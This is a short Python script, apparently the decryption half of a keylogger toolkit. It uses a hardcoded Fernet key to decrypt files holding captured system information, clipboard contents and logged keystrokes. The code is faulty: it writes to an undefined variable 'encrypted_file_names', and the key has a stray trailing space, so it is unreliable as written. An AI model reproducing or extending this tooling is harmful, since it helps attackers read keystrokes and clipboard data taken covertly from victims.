from cryptography.fernet import Fernet

key = "fedbFFIMCr1qNNSl_wtDdGudUrcvLRrm-JBXR0t5Afg= "

system_information_e = "e_system.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(decrypted)


    count += 1